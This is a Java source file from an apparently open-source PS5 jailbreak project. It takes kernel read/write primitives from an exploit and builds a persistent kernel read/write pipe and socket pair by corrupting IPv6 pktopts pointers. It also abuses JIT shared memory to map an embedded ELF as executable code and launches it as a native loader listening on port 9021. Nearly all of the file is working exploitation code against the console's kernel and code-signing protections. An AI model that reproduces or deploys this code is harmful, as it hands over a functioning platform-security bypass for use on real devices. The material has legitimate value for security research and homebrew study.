/*
 * Copyright (c) 2026 Jaime
 * Modified
 *
 * This file is part of Poops-PS5-Java and is licensed under the MIT License.
 * See the LICENSE file in the root of the project for full license information.
 */

package org.bdj.external;

import org.bdj.api.API;
import org.bdj.api.KernelAPI;
import org.bdj.api.Buffer;
import org.bdj.api.Int32Array;
import org.bdj.api.NativeInvoke;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;

import org.bdj.Status;

public class ElfLoader {
    private static final long MAPPING_ADDR = 0x926100000L;
    private static final long SHADOW_MAPPING_ADDR = 0x920100000L;

    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int PROT_EXEC = 0x4;
    private static final int MAP_SHARED = 0x01;
    private static final int MAP_ANONYMOUS = 0x20;
    private static final int O_CREAT = 0x0400;
    private static final int O_RDWR = 0x02;

    private static final int AF_INET6 = 28;
    private static final int IPPROTO_IPV6 = 41;

    private static final String JITSHM_CREATE_SYMBOL = "sceKernelJitCreateSharedMemory";
    private static final String JITSHM_ALIAS_SYMBOL = "sceKernelJitCreateAliasOfSharedMemory";
    private static final String MMAP_SYMBOL = "mmap";
    private static final String PIPE_SYMBOL = "pipe";
    private static final String SCHED_YIELD_SYMBOL = "sched_yield";
    private static final String SOCKET_SYMBOL = "socket";
    private static final String SETSOCKOPT_SYMBOL = "setsockopt";
    private static final String GETPID_SYMBOL = "getpid";
    private static final String PTHREAD_CREATE_SYMBOL = "scePthreadCreate";
    private static final String PTHREAD_ATTR_INIT_SYMBOL = "scePthreadAttrInit";
    private static final String PTHREAD_ATTR_SET_STACK_SIZE_SYMBOL = "scePthreadAttrSetstacksize";
    private static final String PTHREAD_ATTR_SET_DETACH_STATE_SYMBOL = "scePthreadAttrSetdetachstate";
    private static final String PTHREAD_ATTR_DESTROY_SYMBOL = "scePthreadAttrDestroy";
    // private static final String SHM_OPEN_SYMBOL = "shm_open";
    // private static final String FTRUNCATE_SYMBOL = "ftruncate";

    private static final int FILEDESCENT_SIZE = 0x30;
    private static final int INPCB_PKTOPTS = 0x120;

    private static Buffer rwpipe;
    private static Buffer rwpair;
    private static Buffer payloadout;
    private static Buffer args;
    private static Buffer th;
    private static Buffer at;
    private static Buffer threadName;

    private static long jitshm_create;
    private static long jitshm_alias;
    private static long mmap;
    private static long pipe;
    private static long sched_yield;
    private static long socket;
    private static long setsockopt;
    private static long getpid;
    private static long scePthreadCreate;
    private static long scePthreadAttrInit;
    private static long scePthreadAttrSetstacksize;
    private static long scePthreadAttrSetdetachstate;
    private static long scePthreadAttrDestroy;
    // private static long shm_open;
    // private static long ftruncate;

    private static void checkSymbol(long address, String name) {
        if (address == 0) {
            Status.println("[!] Symbol not found: " + name);
            throw new IllegalStateException("symbol not found: " + name);
        }
    }

    public static void init() {
        jitshm_create = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, JITSHM_CREATE_SYMBOL);
        jitshm_alias = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, JITSHM_ALIAS_SYMBOL);
        mmap = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, MMAP_SYMBOL);
        pipe = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PIPE_SYMBOL);
        sched_yield = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCHED_YIELD_SYMBOL);
        socket = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SOCKET_SYMBOL);
        setsockopt = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SETSOCKOPT_SYMBOL);
        getpid = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, GETPID_SYMBOL);
        scePthreadCreate = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PTHREAD_CREATE_SYMBOL);
        scePthreadAttrInit = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PTHREAD_ATTR_INIT_SYMBOL);
        scePthreadAttrSetstacksize = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PTHREAD_ATTR_SET_STACK_SIZE_SYMBOL);
        scePthreadAttrSetdetachstate = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PTHREAD_ATTR_SET_DETACH_STATE_SYMBOL);
        scePthreadAttrDestroy = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PTHREAD_ATTR_DESTROY_SYMBOL);
        // shm_open = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SHM_OPEN_SYMBOL);
        // ftruncate = ExploitNetControlImpl.api.dlsym(API.LIBKERNEL_MODULE_HANDLE, FTRUNCATE_SYMBOL);

        checkSymbol(jitshm_create, "jitshm_create");
        checkSymbol(jitshm_alias, "jitshm_alias");
        checkSymbol(mmap, "mmap");
        checkSymbol(pipe, "pipe");
        checkSymbol(sched_yield, "sched_yield");
        checkSymbol(socket, "socket");
        checkSymbol(setsockopt, "setsockopt");
        checkSymbol(getpid, "getpid");
        checkSymbol(scePthreadCreate, "scePthreadCreate");
        checkSymbol(scePthreadAttrInit, "scePthreadAttrInit");
        checkSymbol(scePthreadAttrSetstacksize, "scePthreadAttrSetstacksize");
        // checkSymbol(scePthreadAttrSetdetachstate, "scePthreadAttrSetdetachstate");
        checkSymbol(scePthreadAttrDestroy, "scePthreadAttrDestroy");
        // checkSymbol(shm_open, "shm_open");
        // checkSymbol(ftruncate, "ftruncate");
    }

    private static int jitshm_create(long a, long b, long c, long d) {
        return (int) ExploitNetControlImpl.api.call(jitshm_create, a, b, c, d);
    }

    private static int jitshm_alias(int a, long b, long c) {
        return (int) ExploitNetControlImpl.api.call(jitshm_alias, a, b, c);
    }

    private static long mmap(long a, long b, long c, long d, long e, long f) {
        return (long) ExploitNetControlImpl.api.call(mmap, a, b, c, d, e, f);
    }

    private static int pipe(long a) {
        return (int) ExploitNetControlImpl.api.call(pipe, a);
    }

    private static int sched_yield() {
        return (int) ExploitNetControlImpl.api.call(sched_yield);
    }

    private static int socket(long a, int b, int c) {
        return (int) ExploitNetControlImpl.api.call(socket, a, b, c);
    }

    private static int setsockopt(int a, int b, int c, long d, long e) {
        return (int) ExploitNetControlImpl.api.call(setsockopt, a, b, c, d, e);
    }

    private static int getpid() {
        return (int) ExploitNetControlImpl.api.call(getpid);
    }

    private static int scePthreadCreate(long a, long b, long c, long d, long e) {
        return (int) ExploitNetControlImpl.api.call(scePthreadCreate, a, b, c, d, e);
    }

    private static int scePthreadAttrInit(long a) {
        return (int) ExploitNetControlImpl.api.call(scePthreadAttrInit, a);
    }

    private static int scePthreadAttrSetstacksize(long a, long b) {
        return (int) ExploitNetControlImpl.api.call(scePthreadAttrSetstacksize, a, b);
    }

    private static int scePthreadAttrSetdetachstate(long a, long b) {
        return (int) ExploitNetControlImpl.api.call(scePthreadAttrSetdetachstate, a, b);
    }

    private static int scePthreadAttrDestroy(long a) {
        return (int) ExploitNetControlImpl.api.call(scePthreadAttrDestroy, a);
    }
/*
    private static int shm_open(long a, int b, int c) {
        return (int) ExploitNetControlImpl.api.call(shm_open, a, b, c);
    }

    private static int ftruncate(long a, long b) {
        return (int) ExploitNetControlImpl.api.call(ftruncate, a, b);
    }
*/
    public static Buffer loadElfFromJar(String resourcePath) {
        try {
            java.io.InputStream is = ElfLoader.class.getResourceAsStream(resourcePath);
            if (is == null)
                return null;
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] tempBuf = new byte[8192];
            int read;
            while ((read = is.read(tempBuf)) != -1)
                baos.write(tempBuf, 0, read);
            byte[] elfBytes = baos.toByteArray();
            Buffer store = new Buffer(elfBytes.length);
            store.put(0, elfBytes);
            if (store.getInt(0) != 0x464C457F)
                return null;
            return store;
        } catch (Exception e) {
            Status.println("[!] Error reading ELF from JAR.");
            return null;
        }
    }

    public static long mapElf(Buffer store) {
        long e_entry = store.getLong(0x18);
        long e_phoff = store.getLong(0x20);
        long e_shoff = store.getLong(0x28);
        int e_phnum = store.getShort(0x38) & 0xFFFF;
        int e_shnum = store.getShort(0x3C) & 0xFFFF;
        long exec_start = 0, exec_end = 0;

        for (int i = 0; i < e_phnum; i++) {
            long ph = store.address() + e_phoff + i * 0x38;
            int p_type = ExploitNetControlImpl.api.read32(ph);
            int p_flags = ExploitNetControlImpl.api.read32(ph + 4);
            long p_off = ExploitNetControlImpl.api.read64(ph + 0x08);
            long p_vaddr = ExploitNetControlImpl.api.read64(ph + 0x10);
            long p_filesz = ExploitNetControlImpl.api.read64(ph + 0x20);
            long p_memsz = ExploitNetControlImpl.api.read64(ph + 0x28);

            if (p_type == 1) { // PT_LOAD
                long aligned = (p_memsz + 0x3FFF) & 0xFFFFC000L;
            if ((p_flags & 1) == 1) {
                exec_start = p_vaddr;
                exec_end = p_vaddr + p_memsz;

                    Buffer fdBuf = new Buffer(8);

                    long retCreate = jitshm_create(0L, aligned, 7L, fdBuf.address());
                    int eh = fdBuf.getInt(0);

                    long retAlias = jitshm_alias(eh, 3L, fdBuf.address());
                    int wh = fdBuf.getInt(0);

                    long mmapRes = mmap(SHADOW_MAPPING_ADDR, aligned, 3L, 0x11L, (long) wh, 0L);

                    if (retCreate != 0 || retAlias != 0 || eh <= 0 || wh <= 0 || mmapRes < 0) {
                        Status.println("[!] FATAL: JIT alloc fallo. ret=" + String.valueOf(retCreate));
                        return 0;
                    }

                    if (p_filesz > 0)
                        ExploitNetControlImpl.api.memcpy(SHADOW_MAPPING_ADDR, store.address() + p_off, p_filesz);
                    if (p_memsz > p_filesz)
                        ExploitNetControlImpl.api.memset(SHADOW_MAPPING_ADDR + p_filesz, 0, (int) (p_memsz - p_filesz));

                    long mmapRes2 = mmap(MAPPING_ADDR + p_vaddr, aligned, 5L, 0x11L, (long) eh, 0L); // PROT_RX

                    if (mmapRes2 < 0) {
                        Status.println("[!] FATAL: JIT map fails. mmap2=" + String.valueOf(mmapRes2));
                        return 0;
                    }

                } else {
                    long mmapRes3 = mmap(MAPPING_ADDR + p_vaddr, aligned, 3L, 0x1012L, 0xFFFFFFFFL, 0L);
                    if (mmapRes3 < 0) {
                        Status.println("[!] FATAL: Error mapping data mmap3=" + String.valueOf(mmapRes3));
                        return 0;
                    }
                    if (p_filesz > 0)
                        ExploitNetControlImpl.api.memcpy(MAPPING_ADDR + p_vaddr, store.address() + p_off, p_filesz);
                }
            }
        }

        for (int i = 0; i < e_shnum; i++) {
            long sh = store.address() + e_shoff + i * 0x40;
            if (ExploitNetControlImpl.api.read32(sh + 4) == 4) { // SHT_RELA
                long sh_off = ExploitNetControlImpl.api.read64(sh + 0x18);
                long sh_size = ExploitNetControlImpl.api.read64(sh + 0x20);
                for (int j = 0; j < (sh_size / 0x18); j++) {
                    long r = store.address() + sh_off + j * 0x18;
                    long r_offset = ExploitNetControlImpl.api.read64(r);
                    long r_info = ExploitNetControlImpl.api.read64(r + 8);
                    long r_addend = ExploitNetControlImpl.api.read64(r + 0x10);

                    if ((r_info & 0xFF) == 0x08) {
                        long dst = (r_offset >= exec_start && r_offset < exec_end)
                                ? (SHADOW_MAPPING_ADDR + r_offset)
                                : (MAPPING_ADDR + r_offset);
                        ExploitNetControlImpl.api.write64(dst, MAPPING_ADDR + r_addend);
                    }
                }
            }
        }
    
        return MAPPING_ADDR + e_entry;
    }

    public static long[] createElfPipes(long fdOfiles) {
        Int32Array pipeFd = new Int32Array(2);
        if (pipe(pipeFd.address()) != 0)
            return null;
        int rfd = pipeFd.get(0);
        int wfd = pipeFd.get(1);

        long prfp = 0;
        for (int i = 0; i < 100; i++) {
            prfp = ExploitNetControlImpl.kapi.kread64(fdOfiles + rfd * FILEDESCENT_SIZE);
            if (prfp != 0)
                break;
            sched_yield();
        }
        if (prfp == 0)
            return null;

        long kpipe = ExploitNetControlImpl.kapi.kread64(prfp);
        if (kpipe == 0)
            return null;

        long pwfp = 0;
        for (int i = 0; i < 100; i++) {
            pwfp = ExploitNetControlImpl.kapi.kread64(fdOfiles + wfd * FILEDESCENT_SIZE);
            if (pwfp != 0)
                break;
            sched_yield();
        }
        if (pwfp == 0)
            return null;

        ExploitNetControlImpl.kapi.kwrite32(prfp + 0x28, ExploitNetControlImpl.kapi.kread32(prfp + 0x28) + 0x100);
        ExploitNetControlImpl.kapi.kwrite32(pwfp + 0x28, ExploitNetControlImpl.kapi.kread32(pwfp + 0x28) + 0x100);
        return new long[] { rfd, wfd, kpipe };
    }

    public static long[] createOverlappedSockets(long fdOfiles) {
        int ms = (int) socket(AF_INET6, 2, 17); // DGRAM, UDP
        int vs = (int) socket(AF_INET6, 2, 17);
        if (ms < 0 || vs < 0)
            return null;

        Buffer mbuf = new Buffer(20);
        mbuf.fill((byte) 0);
        setsockopt(ms, IPPROTO_IPV6, 46, mbuf.address(), 20L); // PKTINFO
        Buffer vbuf = new Buffer(20);
        vbuf.fill((byte) 0);
        setsockopt(vs, IPPROTO_IPV6, 46, vbuf.address(), 20L);

        long mfp = 0;
        long vfp = 0;

        for (int i = 0; i < 100; i++) {
            if (mfp == 0)
                mfp = ExploitNetControlImpl.kapi.kread64(fdOfiles + ms * FILEDESCENT_SIZE);
            if (vfp == 0)
                vfp = ExploitNetControlImpl.kapi.kread64(fdOfiles + vs * FILEDESCENT_SIZE);
            if (mfp != 0 && vfp != 0)
                break;
            sched_yield();
        }

        if (mfp == 0 || vfp == 0)
            return null;

        long mso = ExploitNetControlImpl.kapi.kread64(mfp);
        long vso = ExploitNetControlImpl.kapi.kread64(vfp);
        long mpcb = ExploitNetControlImpl.kapi.kread64(mso + 0x18);
        long mp = ExploitNetControlImpl.kapi.kread64(mpcb + INPCB_PKTOPTS);
        long vpcb = ExploitNetControlImpl.kapi.kread64(vso + 0x18);
        long vp = ExploitNetControlImpl.kapi.kread64(vpcb + INPCB_PKTOPTS);

        if (mp == 0 || vp == 0)
            return null;

        ExploitNetControlImpl.kapi.kwrite32(mfp + 0x28, ExploitNetControlImpl.kapi.kread32(mfp + 0x28) + 0x100);
        ExploitNetControlImpl.kapi.kwrite32(vfp + 0x28, ExploitNetControlImpl.kapi.kread32(vfp + 0x28) + 0x100);
        ExploitNetControlImpl.kapi.kwrite64(mp + 0x10, vp + 0x10);

        return new long[] { ms, vs };
    }

    public static void load(long fdOfiles, String fw) {
        String elfResource = "/elfldr_1001.elf";
        try {
            float fwNum = Float.parseFloat(fw);
            if (fwNum > 10.01f) {
                elfResource = "/elfldr_1200.elf";
            }
        } catch (Exception e) {
            Status.println(" |-> FW parse error, defaulting to 1001.elf");
        }

        Status.println("[*] Loading ELF (" + elfResource + ") from JAR...");
        Buffer store = loadElfFromJar(elfResource);
        if (store == null) {
            Status.println("[!] ELF Loader: '" + elfResource + "' not found in JAR.");
            return;
        }

        long[] pipeData = createElfPipes(fdOfiles);
        long[] socketData = createOverlappedSockets(fdOfiles);
        if (pipeData == null || socketData == null) {
            Status.println("[!] Failed to setup ELF environment.");
            return;
        }

        rwpipe = new Buffer(8);
        rwpipe.putInt(0, (int) pipeData[0]);
        rwpipe.putInt(4, (int) pipeData[1]);
        rwpair = new Buffer(8);
        rwpair.putInt(0, (int) socketData[0]);
        rwpair.putInt(4, (int) socketData[1]);
        payloadout = new Buffer(4);
        payloadout.putInt(0, 0);

        args = new Buffer(0x30);
        args.putLong(0x00, getpid);
        args.putLong(0x08, rwpipe.address());
        args.putLong(0x10, rwpair.address());
        args.putLong(0x18, pipeData[2]);
        args.putLong(0x20, ExploitNetControlImpl.dataBase);
        args.putLong(0x28, payloadout.address());

        th = new Buffer(8);
        at = new Buffer(0x100);
        scePthreadAttrInit(at.address());
        scePthreadAttrSetstacksize(at.address(), 0x80000L);
        if (scePthreadAttrSetdetachstate != 0) {
            scePthreadAttrSetdetachstate(at.address(), 1L);
        }
        threadName = new Buffer(8);
        threadName.put(0, "elfldr\0".getBytes());

        Status.println("[*] Mapping ELF into JIT memory...");
        long entry = mapElf(store);

        if (entry == 0) {
            Status.println("[!] Aborting ELF inyection memory Error.");
            return;
        }

        // Status.println("[*] Launching native thread...", false);
        long ret = scePthreadCreate(th.address(), at.address(), entry, args.address(), threadName.address());

        scePthreadAttrDestroy(at.address());
        if (ret == 0) {
            // Status.println("[+] Thread spawned. Waiting for bootstrap to complete...", false);
            if (!ExploitNetControlImpl.verifySleepHealth(4000)) {
                NativeInvoke.sendNotificationRequest("Unstable!\nReboot and try again");
                Status.println("[!] Unstable! Reboot and try again");
                sched_yield();
                throw new Error("Unstable! Reboot and try again");
            }
            Status.println("[+] ELF Loader ready! Port 9021 Open.");
        } else {
            Status.println("[!] scePthreadCreate failed: " + String.valueOf(ret));
        }
    }

    public static boolean sendElf(String elfPath) {
        InputStream elfInput = null;
        Socket elfldrSocket = null;
        OutputStream socketOutput = null;

        try {
            elfInput = ElfLoader.class.getResourceAsStream(elfPath);
            if (elfInput == null) {
                Status.println("[!] ps5_autoload.elf not found in payload.jar.");
                return false;
            }

            // Status.println("[*] Sending ps5_autoload.elf to 127.0.0.1:9021...", false);
            elfldrSocket = new Socket();
            elfldrSocket.connect(new InetSocketAddress("127.0.0.1", 9021), 500);
            socketOutput = elfldrSocket.getOutputStream();

            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = elfInput.read(buffer)) != -1) {
                socketOutput.write(buffer, 0, bytesRead);
            }
            socketOutput.flush();
            // Status.println("[+] ps5_autoload.elf sent to 127.0.0.1:9021.", false);
            return true;
        } catch (IOException e) {
            Status.printStackTrace("[!] Failed to send ps5_autoload.elf", e);
            return false;
        } finally {
            if (socketOutput != null) {
                try {
                    socketOutput.close();
                } catch (IOException e) {}
            }
            if (elfldrSocket != null) {
                try {
                    elfldrSocket.close();
                } catch (IOException e) {}
            }
            if (elfInput != null) {
                try {
                    elfInput.close();
                } catch (IOException e) {}
            }
        }
    }
}
